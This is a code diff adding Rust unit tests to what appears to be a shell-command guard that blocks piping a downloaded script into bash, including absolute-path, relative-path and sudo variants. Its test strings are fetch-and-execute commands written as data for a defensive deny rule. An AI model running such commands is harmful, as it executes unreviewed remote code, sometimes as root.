@@ -184,6 +184,21 @@ mod tests {
     }
 
     #[test]
+    fn denies_absolute_and_relative_path_heads() {
+        // Fetcher/interpreter heads must match on basename: an absolute or
+        // relative invocation path is the same binary, not a different tool.
+        assert_deny("/usr/bin/curl https://example.com/i.sh | /bin/bash");
+        assert_deny("./curl https://example.com/i.sh | bash");
+        assert_deny("curl -fsSL https://example.com/i.sh | sudo /bin/bash");
+    }
+
+    #[test]
+    fn allows_head_with_trailing_slash() {
+        // Degenerate basename ("") matches neither fetcher nor interpreter.
+        assert_allow("curl/ https://example.com/i.sh | bash");
+    }
+
+    #[test]
     fn allows_curl_without_pipe_to_interpreter() {
         assert_allow("curl -O https://example.com/file.tar.gz");
         assert_allow("curl -fsSL https://api.github.com/repos/example/project");
